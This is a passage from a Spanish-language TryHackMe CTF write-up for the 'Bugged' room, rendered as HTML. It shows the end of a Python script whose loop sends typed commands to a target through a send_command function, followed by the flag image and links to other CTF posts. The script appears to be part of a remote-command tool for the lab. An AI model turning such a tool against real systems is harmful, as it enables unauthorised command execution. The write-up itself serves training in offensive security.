+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;$ &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>cmd</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>cmd</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>send_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;/n[!] Saliendo...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Sesión finalizada&#34;</span><span class=p>)</span></span></span></code></pre></div><p><img src=/images/posts/bugged/flag_bugged.png alt=flag></p><hr></div><footer><section class=see-also><h3 id=también-ver-en-tryhackme>También ver en TryHackMe
+<a class=heading-link href=#tambi%c3%a9n-ver-en-tryhackme><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><nav><ul><li><a href=/posts/soupedecode01/>Soupedecode 01 CTF</a></li><li><a href=/posts/billing/>Billing CTF</a></li><li><a href=/posts/publisher/>Publisher CTF</a></li><li><a href=/posts/blueprint/>Blueprint CTF</a></li></ul></nav></section></footer></article></section></div><footer class=footer><section class=container>©
+2019 -
+2026
+David León
+·
+Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
